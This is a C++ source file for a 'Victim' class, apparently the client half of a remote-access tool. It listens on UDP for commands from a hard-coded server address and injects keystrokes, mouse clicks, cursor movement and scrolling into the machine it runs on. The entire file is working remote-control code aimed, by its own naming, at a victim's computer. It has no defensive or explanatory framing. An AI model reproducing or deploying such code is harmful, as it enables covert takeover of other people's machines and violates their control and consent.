#include "victim.h"

Victim::Victim(sf::UdpSocket* s)
    :
    socket(s)
{
    for (int i = 0; i < 256; i++)
        keysStates[i] = false;
}

int Victim::controlVictim()
{
    while (isRunning)
    {
        size_t size;
        sf::IpAddress ip;
        unsigned short port;
        char msg[6];
        socket->receive(msg, sizeof(msg), size, ip, port);

        if (ip != SERVER_IP || port != SERVER_PORT)
            continue;
        
        //exit program
        if (msg[0] == 'e') {
            isRunning = false;
        }
        //key pressed
        else if (msg[0] == 'n') {
            int vkc = int(msg[1]);
            keysStates[vkc] = true;

            //if its a mouse key, treat it accordingly
            if (vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06)
                Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), true);
            else
                Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), true);
        }
        //key released
        else if (msg[0] == 'm') {
            int vkc = int(msg[1]);
            keysStates[vkc] = false;

            //if its a mouse key, treat it accordingly
            if (vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06)
                Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), false);
            else
                Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), false);
        }
        //mouse moved
        else if (msg[0] == 'l') {
            auto val = [](char c) {
                return ((int(c) >= 0) ? int(c) : 256+int(c));
            };
            float x, y;
            x = val(msg[1]) / 256.f;
            y = val(msg[2]) / 256.f;
            Mlib::Mouse::setPos(Mlib::Vec2i(x * screenSize.x, y * screenSize.y));
        }
        //wheel scrolled
        else if (msg[0] == 'k')
        {
            Mlib::Mouse::simulateScroll(int(msg[1]) * 100.f);
        }
        //release all keys
        else if (msg[0] == 'a') {
            for (int i = 0; i < 255; i++)
                Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
        }
    }

    return 0;
}
